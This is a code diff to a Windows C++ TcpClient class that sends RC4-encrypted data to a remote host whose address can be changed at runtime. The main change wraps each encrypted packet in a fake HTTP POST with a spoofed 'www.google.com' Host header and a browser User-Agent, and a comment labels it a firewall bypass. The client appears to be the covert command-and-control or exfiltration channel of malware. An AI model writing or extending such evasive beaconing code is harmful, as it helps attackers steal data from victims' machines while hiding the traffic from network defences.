@@ -23,7 +23,7 @@ TcpClient::~TcpClient() {
     if(sock != INVALID_SOCKET) {
         closesocket(sock);
     }
-    if(encryption) delete (RC4*)encryption;
+    if(encryption) delete encryption;
     WSACleanup();
 }
 
@@ -34,7 +34,7 @@ bool TcpClient::Connect() {
     }
     
     // Reset Encryption 
-    if(encryption) delete (RC4*)encryption;
+    if(encryption) delete encryption;
     encryption = new RC4(key);
 
     struct addrinfo hints, *res;
@@ -62,17 +62,36 @@ bool TcpClient::Connect() {
     return true;
 }
 
+void TcpClient::SetTarget(const std::string& newIp, int newPort) {
+    if(isConnected) {
+        closesocket(sock);
+        sock = INVALID_SOCKET;
+        isConnected = false;
+    }
+    ip = newIp;
+    port = newPort;
+}
+
 bool TcpClient::SendData(const std::string& data) {
     // 1. If not connected, try to connect
     if (!isConnected) {
         if (!Connect()) return false;
     }
 
-    // 2. Encrypt & Send
+    // 2. Encrypt
     std::string packet = data + "\n";
-    std::string cipher = ((RC4*)encryption)->Encrypt(packet);
+    std::string cipher = encryption->Encrypt(packet);
     
-    int sent = send(sock, cipher.c_str(), cipher.length(), 0);
+    // 3. Masquerade as HTTP (Firewall Bypass)
+    std::string http = "POST /api/v1/log HTTP/1.1\r\n";
+    http += "Host: www.google.com\r\n";
+    http += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
+    http += "Content-Type: application/octet-stream\r\n";
+    http += "Content-Length: " + std::to_string(cipher.size()) + "\r\n";
+    http += "\r\n";
+    http += cipher;
+    
+    int sent = send(sock, http.c_str(), http.length(), 0);
 
     // 3. Handle Failure (Broken Pipe usually)
     if (sent == SOCKET_ERROR) {
